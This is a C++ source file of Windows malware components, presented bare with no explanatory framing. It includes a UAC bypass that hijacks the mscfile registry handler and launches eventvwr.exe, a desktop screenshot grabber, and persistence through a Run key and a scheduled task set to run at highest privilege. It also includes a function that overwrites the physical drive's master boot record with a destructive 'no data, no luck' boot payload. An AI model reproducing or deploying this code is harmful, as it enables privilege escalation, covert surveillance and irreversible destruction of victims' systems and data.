#include <windows.h>
#include <winreg.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <lmcons.h>

bool PrivEsc(std::string data)
{
  std::string input = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe & "+data;
  std::cout << input;
	HKEY key = HKEY_CURRENT_USER;
	if(RegCreateKeyEx(key, TEXT("Software\\Classes\\mscfile\\shell\\open\\command"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL)!=0){
		return false;
	}
  if(RegSetValueEx(key, NULL, 0L, REG_EXPAND_SZ,(LPBYTE)input.c_str(), strlen(input.c_str())*sizeof(char))!=0){
    return false;
  }
	RegCloseKey(key);
  std::system("start C:\\Windows\\System32\\eventvwr.exe");
  Sleep(2000);
  return true;
  //input = "%SystemRoot%\\system32\\mmc.exe \"%1\" %*";
}

bool CleanUp()
{
  std::string input = "%SystemRoot%\\system32\\mmc.exe \"%1\" %*";
	HKEY key = HKEY_CURRENT_USER;
	if(RegCreateKeyEx(key, TEXT("Software\\Classes\\mscfile\\shell\\open\\command"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL)!=0){
		return false;
	}
  if(RegSetValueEx(key, NULL, 0L, REG_EXPAND_SZ,(LPBYTE)input.c_str(), strlen(input.c_str())*sizeof(char))!=0){
    return false;
  }
	RegCloseKey(key);
  return true;
  //input = "%SystemRoot%\\system32\\mmc.exe \"%1\" %*";
}

std::string Username()
{
	char username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	GetUserName(username, &username_len);
	return username;
}

void ScreenShot(const char* BmpName)
{
	HWND DesktopHwnd = GetDesktopWindow();
	RECT DesktopParams;
	HDC DevC = GetDC(DesktopHwnd);
	GetWindowRect(DesktopHwnd,&DesktopParams);
	DWORD Width = DesktopParams.right - DesktopParams.left;
	DWORD Height = DesktopParams.bottom - DesktopParams.top;

	DWORD FileSize = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+(sizeof(RGBTRIPLE)+1*(Width*Height*4));
	char *BmpFileData = (char*)GlobalAlloc(0x0040,FileSize);

	PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER)BmpFileData;
	PBITMAPINFOHEADER  BInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];

	BFileHeader->bfType = 0x4D42; // BM
	BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
	BFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);

	BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	BInfoHeader->biPlanes = 1;
	BInfoHeader->biBitCount = 24;
	BInfoHeader->biCompression = BI_RGB;
	BInfoHeader->biHeight = Height;
	BInfoHeader->biWidth = Width;

	RGBTRIPLE *Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)];

	HDC CaptureDC = CreateCompatibleDC(DevC);
	HBITMAP CaptureBitmap = CreateCompatibleBitmap(DevC,Width,Height);
	SelectObject(CaptureDC,CaptureBitmap);
	BitBlt(CaptureDC,0,0,Width,Height,DevC,0,0,SRCCOPY|CAPTUREBLT);
	GetDIBits(CaptureDC,CaptureBitmap,0,Height,Image,(LPBITMAPINFO)BInfoHeader, DIB_RGB_COLORS);

	DWORD Junk;
	HANDLE FH = CreateFileA(BmpName,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,0,0);
	WriteFile(FH,BmpFileData,FileSize,&Junk,0);
	CloseHandle(FH);
  GlobalFree(BmpFileData);
}

BOOL IsAdmin() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

bool PersistRoot(std::string data)
{
  std::string cmd = "SCHTASKS /CREATE /SC ONSTART /TN \"YESYES\" /TR \""+data+"\" /RL HIGHEST";
  std::string name = "7bFe03nE";
  std::cout << cmd;
	std::system(cmd.c_str());
  return true;
}

bool Persist(std::string data)
{
  std::string input = data;
  std::string name = "9o2m3bo";
  std::cout << input;
	HKEY key = HKEY_CURRENT_USER;
	if(RegCreateKeyEx(key, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL)!=0){
		return false;
	}
  if(RegSetValueEx(key, name.c_str(), 0L, REG_SZ,(LPBYTE)input.c_str(), strlen(input.c_str())*sizeof(char))!=0){
    return false;
  }
	RegCloseKey(key);
	return true;
}

bool UnPersist()
{
	HKEY key = HKEY_CURRENT_USER;
  std::string name = "9o2m3bo";
	if(RegCreateKeyEx(key, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL)!=0){
		return false;
	}
  if(RegDeleteValue(key,(LPCSTR)name.c_str())!=0){
    return false;
  }
	RegCloseKey(key);
	return true;
}

int WriteMBR()
{
	BYTE new_mbr[512] = {0xeb, 0x0, 0xe8, 0x1f, 0x0, 0x8c, 0xc8, 0x8e, 0xd8, 0xbe, 0x33, 0x7c, 0xe8, 0x0, 0x0, 0x50, 0xfc, 0x8a, 0x4, 0x3c, 0x0, 0x74, 0x6, 0xe8, 0x5, 0x0, 0x46, 0xeb, 0xf4, 0xeb, 0xfe, 0xb4, 0xe, 0xcd, 0x10, 0xc3, 0xb4, 0x7, 0xb0, 0x0, 0xb7, 0x9, 0xb9, 0x0, 0x0, 0xba, 0x4f, 0x18, 0xcd, 0x10, 0xc3, 0x6e, 0x6f, 0x20, 0x66, 0x69, 0x6c, 0x65, 0x73, 0x2c, 0x20, 0x6e, 0x6f, 0x20, 0x62, 0x6f, 0x6f, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x2c, 0x20, 0x6e, 0x6f, 0x20, 0x64, 0x61, 0x74, 0x61, 0x2c, 0x20, 0x6e, 0x6f, 0x20, 0x6c, 0x75, 0x63, 0x6b, 0x2e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55, 0xaa
  };

  int size = 512;
	DWORD numBytes;
	HANDLE rawdriveh;

	rawdriveh = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	numBytes = 0;
	if(SetFilePointer(rawdriveh, 0, 0, 0) != 0 ||
		WriteFile(rawdriveh, new_mbr, size, &numBytes, 0) == FALSE ||
		numBytes != size)
	{
		return false;
	}

	CloseHandle(rawdriveh);
	return true;
}

std::string GetOS(){
  OSVERSIONINFOEX info;
  SecureZeroMemory(&info, sizeof(OSVERSIONINFOEX));
  info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  GetVersionEx((LPOSVERSIONINFO)&info);

  if(info.dwMajorVersion == 10){
    return "Windows 10";
  }else if(info.dwMajorVersion == 6){
    if(info.dwMinorVersion == 1){
      return "Windows 7";
    }else if(info.dwMinorVersion == 2){
      return "Windows 8";
    }else if(info.dwMinorVersion == 3){
      return "Windows 8.1";
    }else if(info.dwMinorVersion == 0){
      return "Windows Vista";
    }else{
      return "Unknown";
    }
  }else{
    return "Unknown";
  }
}
